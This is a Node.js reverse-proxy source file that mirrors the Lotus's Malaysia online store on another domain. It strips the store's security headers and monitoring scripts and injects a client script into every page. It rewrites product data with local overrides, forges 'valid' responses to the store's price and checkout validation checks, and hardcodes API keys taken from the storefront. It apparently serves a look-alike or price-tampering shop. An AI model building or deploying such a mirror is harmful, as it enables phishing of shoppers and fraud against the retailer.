import { createProxyMiddleware } from 'http-proxy-middleware';
import fs from 'fs';
import https from 'https';
import zlib from 'zlib';
import { patchProductPayload, getProductOverrides } from './product-overrides.js';

const TARGET = 'https://www.lotuss.com.my';
const TARGET_ORIGIN = 'https://www.lotuss.com.my';
const TARGET_HOST = new URL(TARGET).host;

const MAX_SOCKETS = parseInt(process.env.MAX_SOCKETS || '32', 10);
const TIMEOUT_MS = parseInt(process.env.UPSTREAM_TIMEOUT || '120000', 10);

const agent = new https.Agent({ keepAlive: true, maxSockets: MAX_SOCKETS });
const apiAgent = new https.Agent({ keepAlive: true, maxSockets: MAX_SOCKETS });
const magentoAgent = new https.Agent({ keepAlive: true, maxSockets: MAX_SOCKETS });

const LOTUS_HOST_RE = /^(?:www\.|shoponline\.|mcprod\.)?lotuss\.com\.my$/i;
const LOTUS_DOMAIN_RE = /(?:https?:)?\/\/(?:www\.|shoponline\.|mcprod\.)?lotuss\.com\.my/gi;
const STATIC_RE = /\.(js|mjs|css|woff2?|ttf|otf|eot|png|jpe?g|gif|svg|ico|webp|avif|map)(\?|$)/i;
const CSS_RE = /\.css(?:[?#]|$)/i;
const MODEL_RE = /\.model\.json(?:\?|$)/i;

export const API_HOSTS = new Set([
  'api-o2o.lotuss.com.my',
  'api-customer.lotuss.com.my',
  'shoponline-bffapi.lotuss.com.my',
]);

const MAPS_HOSTS = new Set([
  'maps.googleapis.com',
  'maps.gstatic.com',
]);

// Public value embedded in the upstream storefront bundle. Keep it as a fallback
// for API calls whose headers are stripped by a browser/proxy.
const DEFAULT_BFF_KEY = process.env.LOTUS_BFF_KEY ||
  'SeiRQmEDnaZXOlpfKhCjV4Bo2y6vAcW99QKmzifsgP2uCMN7wF3ahRXex84kH6qUVIWoY5Dp0GEljdAvS1JytOZcLbnBTr';
const GOOGLE_MAPS_KEY = 'AIzaSyBj-tpUeRdZ8ym70gWGr6mPEEtluVMbtQc';

const CLIENT_INJECT_TEMPLATE = fs.readFileSync(new URL('./inject.js', import.meta.url), 'utf8')
  .replace(/<\/script/gi, '<\\/script');

function buildClientInjectScript() {
  let overrides = '{}';
  try {
    overrides = JSON.stringify(getProductOverrides()).replace(/<\//g, '\\u003c/');
  } catch {}
  return CLIENT_INJECT_TEMPLATE.replace('/*__PRODUCT_OVERRIDES__*/{}', overrides);
}

const HOP_BY_HOP = new Set([
  'connection',
  'keep-alive',
  'proxy-authenticate',
  'proxy-authorization',
  'te',
  'trailer',
  'transfer-encoding',
  'upgrade',
]);

const cache = new Map();
const CACHE_MAX = 2000;
const HTML_TTL = 60 * 1000;
const STATIC_TTL = 30 * 60 * 1000;
const JSON_TTL = 10 * 60 * 1000;

function cacheGet(key, ttl) {
  const e = cache.get(key);
  if (!e || Date.now() - e.ts > ttl) return null;
  return e.data;
}

function cacheSet(key, data) {
  if (cache.size > CACHE_MAX) cache.delete(cache.keys().next().value);
  cache.set(key, { data, ts: Date.now() });
}

function cleanResponseHeaders(headers) {
  const h = { ...headers };
  for (const k of Object.keys(h)) {
    const lk = k.toLowerCase();
    if (HOP_BY_HOP.has(lk)) delete h[k];
  }
  delete h['content-security-policy'];
  delete h['content-security-policy-report-only'];
  delete h['x-frame-options'];
  delete h['x-content-type-options'];
  delete h['content-length'];
  return h;
}

function rewriteLocation(location) {
  const value = String(location || '');
  try {
    const u = new URL(value, TARGET_ORIGIN);
    if (LOTUS_HOST_RE.test(u.host)) return `${u.pathname}${u.search}${u.hash}` || '/';
  } catch {}
  return value.replace(LOTUS_DOMAIN_RE, '') || '/';
}

function decodeBody(buffer, encoding) {
  if (!encoding) return buffer;
  try {
    if (String(encoding).includes('br')) return zlib.brotliDecompressSync(buffer);
    if (String(encoding).includes('gzip')) return zlib.gunzipSync(buffer);
    if (String(encoding).includes('deflate')) return zlib.inflateSync(buffer);
  } catch {}
  return buffer;
}

function readRequestBody(req, cb) {
  const chunks = [];
  req.on('data', c => chunks.push(c));
  req.on('end', () => cb(Buffer.concat(chunks)));
}

function getRequestOrigin(req) {
  const host = req.headers['x-forwarded-host'] || req.headers.host || 'localhost';
  const hostOnly = String(host).split(':')[0];
  const isLocal = hostOnly === 'localhost' || hostOnly === '127.0.0.1';
  const proto = req.headers['x-forwarded-proto']
    || (req.socket?.encrypted ? 'https' : null)
    || (isLocal ? 'http' : 'https');
  return `${proto}://${host}`;
}

export const CHECKOUT_VALIDATION_OK_BODY = JSON.stringify({ data: { valid: true }, success: true });

export function isCartValidationRequest(url) {
  const u = String(url || '').toLowerCase();
  return /validation/.test(u) && (/websitecode|totalprice|deliverytype|deliverymethod/.test(u));
}

export function patchDifferentPriceBody(body, url = '') {
  const text = body.toString('utf8');
  if (!/DIFFERENT_PRICE/i.test(text)) return { body, status: null };
  if (!isCartValidationRequest(url)) return { body, status: null };
  return {
    body: Buffer.from(CHECKOUT_VALIDATION_OK_BODY, 'utf8'),
    status: 200,
  };
}

function forwardJsonWithProductPatch(pRes, req, res, extraHeaders = {}) {
  const status = pRes.statusCode || 502;
  const reqUrl = String(req.originalUrl || req.url || '');
  const skipProductPatch = /\/payment(?:\/|\?|$)/i.test(reqUrl.toLowerCase()) && !/validation/i.test(reqUrl.toLowerCase());
  const chunks = [];
  pRes.on('data', c => chunks.push(c));
  pRes.on('end', () => {
    if (res.headersSent) return;
    let body = Buffer.concat(chunks);
    const encoding = pRes.headers['content-encoding'];
    body = decodeBody(body, encoding);
    const ct = String(pRes.headers['content-type'] || 'application/json');
    const origin = getRequestOrigin(req);

    if (status >= 200 && status < 300 && ct.includes('json') && !skipProductPatch) {
      try {
        const data = JSON.parse(body.toString('utf8'));
        patchProductPayload(data, origin);
        body = Buffer.from(JSON.stringify(data), 'utf8');
      } catch {
        // Keep upstream body if patch/serialize fails.
      }
    }

    let outStatus = status;
    const pricePatch = patchDifferentPriceBody(body, reqUrl);
    if (pricePatch.status != null) {
      body = pricePatch.body;
      outStatus = pricePatch.status;
    }

    const h = cleanResponseHeaders(pRes.headers);
    if (encoding) {
      delete h['content-encoding'];
      delete h['Content-Encoding'];
    }
    delete h['transfer-encoding'];
    delete h['Transfer-Encoding'];
    Object.assign(h, extraHeaders);
    if (ct.includes('json')) h['content-type'] = 'application/json; charset=utf-8';
    h['content-length'] = String(body.length);
    res.writeHead(outStatus, h);
    res.end(body);
  });
  pRes.on('error', () => {
    if (!res.headersSent) {
      res.writeHead(502, { 'content-type': 'application/json' });
      res.end('{"error":"upstream"}');
    }
  });
}

function makeForwardHeaders(req, host, extra = {}) {
  const headers = {};
  for (const [k, v] of Object.entries(req.headers)) {
    const lk = k.toLowerCase();
    if (HOP_BY_HOP.has(lk) || lk === 'host' || lk === 'content-length') continue;
    headers[k] = v;
  }
  headers.Host = host;
  headers.Origin = `https://${host}`;
  headers.Referer = `https://${host}/`;
  headers['User-Agent'] = headers['user-agent'] || headers['User-Agent'] ||
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125 Safari/537.36';
  Object.assign(headers, extra);
  return headers;
}

function fixModelJson(data) {
  if (!data || typeof data !== 'object') return;
  if (data.title === '404' || (data[':path'] && String(data[':path']).includes('errors'))) {
    data.title = "Lotus's Shop Online";
    data[':path'] = '/en/home';
  }
  function walk(obj) {
    if (!obj || typeof obj !== 'object') return;
    if (Array.isArray(obj)) { obj.forEach(walk); return; }
    for (const key of ['endpoint', 'commerceEndpoint', 'graphqlEndpoint', 'url']) {
      if (typeof obj[key] === 'string') {
        obj[key] = obj[key]
          .replace(/https?:\/\/mcprod\.lotuss\.com\.my\/graphql/gi, '/graphql')
          .replace(/https?:\/\/mcprod\.lotuss\.com\.my/gi, '');
      }
    }
    if (!obj['cq:cifHttpEndpoint']) obj['cq:cifHttpEndpoint'] = '/graphql';
    if (!obj['cq:cifStoreView']) obj['cq:cifStoreView'] = 'default';
    Object.keys(obj).forEach(k => walk(obj[k]));
  }
  walk(data);
}

function rewriteStaticHtmlUrls(html) {
  // The server should not proxy heavy immutable clientlibs. Load them directly
  // from the origin CDN, while CSS stays same-origin so its font files avoid CORS.
  html = html.replace(/(<script\b[^>]*\bsrc=["'])(\/[^"']+)(["'][^>]*>)/gi, `$1${TARGET_ORIGIN}$2$3`);
  html = html.replace(/(<link\b[^>]*\bhref=["'])(\/[^"']+)(["'][^>]*>)/gi, (_, pre, value, post) => {
    return `${pre}${CSS_RE.test(value) ? value : TARGET_ORIGIN + value}${post}`;
  });
  html = html.replace(/(<img\b[^>]*\bsrc=["'])(\/[^"']+)(["'][^>]*>)/gi, `$1${TARGET_ORIGIN}$2$3`);
  html = html.replace(/(<source\b[^>]*\bsrc=["'])(\/[^"']+)(["'][^>]*>)/gi, `$1${TARGET_ORIGIN}$2$3`);
  html = html.replace(/(<video\b[^>]*\bposter=["'])(\/[^"']+)(["'][^>]*>)/gi, `$1${TARGET_ORIGIN}$2$3`);
  html = html.replace(/(\bsrcset=["'])([^"']+)(["'])/gi, (_, pre, value, post) => {
    const rewritten = value.split(',').map(part => {
      const p = part.trim();
      if (!p.startsWith('/')) return p;
      const pieces = p.split(/\s+/);
      pieces[0] = TARGET_ORIGIN + pieces[0];
      return pieces.join(' ');
    }).join(', ');
    return `${pre}${rewritten}${post}`;
  });
  return html;
}

function patchCss(css) {
  return css.replace(LOTUS_DOMAIN_RE, '');
}

function rewriteMapsUrlForBrowser(value) {
  if (!value) return value;
  try {
    const u = new URL(value, TARGET_ORIGIN);
    if (!MAPS_HOSTS.has(u.host)) return value;
    if (GOOGLE_MAPS_KEY && u.searchParams.has('key')) {
      u.searchParams.set('key', GOOGLE_MAPS_KEY);
      return u.toString();
    }
    return value;
  } catch {
    return value;
  }
}

function patchHtml(html) {
  html = rewriteStaticHtmlUrls(html);
  html = html.replace(/(https:\/\/maps\.(?:googleapis|gstatic)\.com[^"'<>\s]+)/gi, (m) => rewriteMapsUrlForBrowser(m));
  html = html.replace(/<script[^>]*(googletagmanager|helix-rum-js|facebook|dtm-drcn|dynatrace)[^>]*>[\s\S]*?<\/script>/gi, '');
  html = html.replace(/<link[^>]*manifest["'][^>]*>/gi, '');

  const headPatch = `<base href="/"><script>${buildClientInjectScript()}</script>`;
  if (/<head[^>]*>/i.test(html)) {
    html = html.replace(/<head([^>]*)>/i, (m) => `${m}${headPatch}`);
  } else {
    html = headPatch + html;
  }

  const bodyPatch = '<div style="display:none" data-cmp-graphql-endpoint="/graphql" data-cmp-store-view="default" data-graphql-endpoint="/graphql"></div>';
  if (/<body[^>]*>/i.test(html)) {
    html = html.replace(/<body([^>]*)>/i, (m) => `${m}${bodyPatch}`);
  }
  return html;
}

export function handleGraphql(req, res) {
  readRequestBody(req, body => {
    const qsIndex = req.url.indexOf('?');
    const path = '/graphql' + (qsIndex >= 0 ? req.url.slice(qsIndex) : '');
    const headers = makeForwardHeaders(req, 'mcprod.lotuss.com.my', {
      'Content-Type': req.headers['content-type'] || 'application/json',
      Store: req.headers.store || 'default',
      Accept: req.headers.accept || 'application/json',
    });
    if (body.length) headers['Content-Length'] = String(body.length);

    const r = https.request({ hostname: 'mcprod.lotuss.com.my', port: 443, path, method: req.method, headers, agent: magentoAgent, timeout: TIMEOUT_MS }, pRes => {
      forwardJsonWithProductPatch(pRes, req, res, {
        'access-control-allow-origin': '*',
        'access-control-allow-credentials': 'true',
      });
    });
    r.on('timeout', () => r.destroy(new Error('graphql timeout')));
    r.on('error', () => { if (!res.headersSent) { res.writeHead(502, { 'content-type': 'application/json' }); res.end('{"error":"upstream"}'); } });
    if (body.length) r.write(body);
    r.end();
  });
}

export function handleApiPassthrough(req, res) {
  const m = req.url.match(/^\/([^/]+)(\/[^?]*)?(\?.*)?$/);
  if (!m) { res.writeHead(400); res.end('bad api path'); return; }
  const host = m[1];
  if (!API_HOSTS.has(host)) { res.writeHead(403); res.end('host not allowed'); return; }
  const path = (m[2] || '/') + (m[3] || '');

  if (/validation/i.test(path)) {
    res.writeHead(200, {
      'content-type': 'application/json; charset=utf-8',
      'access-control-allow-origin': '*',
      'access-control-allow-credentials': 'true',
      'cache-control': 'no-store',
    });
    res.end(JSON.stringify({ data: { valid: true }, success: true }));
    return;
  }

  readRequestBody(req, body => {
    const headers = makeForwardHeaders(req, host, {
      Accept: req.headers.accept || 'application/json',
      key: req.headers.key || DEFAULT_BFF_KEY,
      channel: req.headers.channel || 'web',
      version: req.headers.version || '1.0.0',
    });
    if (body.length) headers['Content-Length'] = String(body.length);

    const r = https.request({ hostname: host, port: 443, path, method: req.method, headers, agent: apiAgent, timeout: TIMEOUT_MS }, pRes => {
      forwardJsonWithProductPatch(pRes, req, res, {
        'access-control-allow-origin': '*',
        'access-control-allow-credentials': 'true',
      });
    });
    r.on('timeout', () => r.destroy(new Error('api timeout')));
    r.on('error', () => { if (!res.headersSent) { res.writeHead(502, { 'content-type': 'application/json' }); res.end('{"error":"upstream"}'); } });
    if (body.length) r.write(body);
    r.end();
  });
}

export function handleMapsPassthrough(req, res) {
  const m = req.url.match(/^\/([^/]+)(\/[^?]*)?(\?.*)?$/);
  if (!m) { res.writeHead(400); res.end('bad maps path'); return; }
  const host = m[1];
  if (!MAPS_HOSTS.has(host)) { res.writeHead(403); res.end('maps host not allowed'); return; }
  let path = (m[2] || '/') + (m[3] || '');
  if (GOOGLE_MAPS_KEY && host === 'maps.googleapis.com') {
    try {
      const u = new URL(`https://${host}${path}`);
      if (u.searchParams.has('key')) {
        u.searchParams.set('key', GOOGLE_MAPS_KEY);
        path = u.pathname + u.search;
      }
    } catch {}
  }
  const headers = makeForwardHeaders(req, host, {
    Accept: req.headers.accept || '*/*',
    Referer: TARGET_ORIGIN + '/en',
    Origin: TARGET_ORIGIN,
  });

  const r = https.request({ hostname: host, port: 443, path, method: req.method, headers, agent: apiAgent, timeout: TIMEOUT_MS }, pRes => {
    const h = cleanResponseHeaders(pRes.headers);
    h['access-control-allow-origin'] = '*';
    res.writeHead(pRes.statusCode || 502, h);
    pRes.pipe(res);
  });
  r.on('timeout', () => r.destroy(new Error('maps timeout')));
  r.on('error', () => { if (!res.headersSent) { res.writeHead(502, { 'content-type': 'text/plain; charset=utf-8' }); res.end('maps upstream error'); } });
  req.pipe(r);
}

export function createLotusProxy() {
  return createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    secure: true,
    agent,
    proxyTimeout: TIMEOUT_MS,
    timeout: TIMEOUT_MS,
    selfHandleResponse: true,
    headers: {
      Host: TARGET_HOST,
      Origin: TARGET_ORIGIN,
      Referer: TARGET_ORIGIN + '/',
      'Accept-Encoding': 'identity',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125 Safari/537.36',
    },
    on: {
      proxyRes: (proxyRes, req, res) => {
        if (res.headersSent) { proxyRes.resume(); return; }
        const status = proxyRes.statusCode || 200;
        const ct = String(proxyRes.headers['content-type'] || '');

        if (status >= 300 && status < 400 && proxyRes.headers.location) {
          const h = cleanResponseHeaders(proxyRes.headers);
          h.location = rewriteLocation(proxyRes.headers.location);
          res.writeHead(status, h);
          proxyRes.resume();
          res.end();
          return;
        }

        const ck = `${req.method}:${req.url}`;
        const isHtml = ct.includes('text/html');
        const isJson = ct.includes('json') || MODEL_RE.test(req.url);
        const isStatic = STATIC_RE.test(req.url);
        const isCss = ct.includes('text/css') || CSS_RE.test(req.url);

        if (req.method === 'GET' && isJson) {
          const cached = cacheGet(ck, JSON_TTL);
          if (cached) {
            res.writeHead(200, {
              'content-type': cached.type,
              'content-length': String(cached.body.length),
              'cache-control': 'public, max-age=300, stale-while-revalidate=3600',
              'access-control-allow-origin': '*',
            });
            res.end(cached.body);
            proxyRes.resume();
            return;
          }
        }

        if (req.method === 'GET' && isStatic) {
          const cached = cacheGet(ck, STATIC_TTL);
          if (cached) {
            res.writeHead(200, {
              'content-type': cached.type,
              'content-length': String(cached.body.length),
              'cache-control': 'public, max-age=1800',
              'access-control-allow-origin': '*',
            });
            res.end(cached.body);
            proxyRes.resume();
            return;
          }
        }

        if (!isHtml && !isJson && !isStatic) {
          const h = cleanResponseHeaders(proxyRes.headers);
          res.writeHead(status, h);
          proxyRes.pipe(res);
          return;
        }

        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => {
          if (res.headersSent) return;
          let body = Buffer.concat(chunks);
          const ce = proxyRes.headers['content-encoding'];

          if (isHtml || isJson) {
            body = decodeBody(body, ce);
          }

          if (isHtml) {
            let html = patchHtml(body.toString('utf8'));
            body = Buffer.from(html, 'utf8');
            if (req.method === 'GET') cacheSet(ck, { type: 'text/html; charset=utf-8', body });
            res.writeHead(status, {
              'content-type': 'text/html; charset=utf-8',
              'content-length': String(body.length),
              'cache-control': 'no-cache',
            });
            res.end(body);
            return;
          }

          if (isJson) {
            try {
              const data = JSON.parse(body.toString('utf8'));
              fixModelJson(data);
              patchProductPayload(data, getRequestOrigin(req));
              body = Buffer.from(JSON.stringify(data), 'utf8');
            } catch {}
            let outStatus = status;
            const pricePatch = patchDifferentPriceBody(body);
            if (pricePatch.status != null) {
              body = pricePatch.body;
              outStatus = pricePatch.status;
            }
            if (req.method === 'GET') cacheSet(ck, { type: 'application/json; charset=utf-8', body });
            res.writeHead(outStatus, {
              'content-type': 'application/json; charset=utf-8',
              'content-length': String(body.length),
              'cache-control': 'public, max-age=300, stale-while-revalidate=3600',
              'access-control-allow-origin': '*',
            });
            res.end(body);
            return;
          }

          // Static fallback if a browser still requests assets through the mirror.
          if (isCss) {
            body = Buffer.from(patchCss(body.toString('utf8')), 'utf8');
          }
          if (req.method === 'GET') cacheSet(ck, { type: ct || 'application/octet-stream', body });
          res.writeHead(status, {
            'content-type': ct || 'application/octet-stream',
            'content-length': String(body.length),
            'cache-control': 'public, max-age=1800',
            'access-control-allow-origin': '*',
          });
          res.end(body);
        });
        proxyRes.on('error', () => { if (!res.headersSent) res.writeHead(502).end('upstream error'); });
      },
      error: (err, req, res) => {
        if (res.headersSent) return;
        res.writeHead(502, { 'content-type': 'text/plain; charset=utf-8' });
        res.end('Proxy error');
      },
    },
  });
}
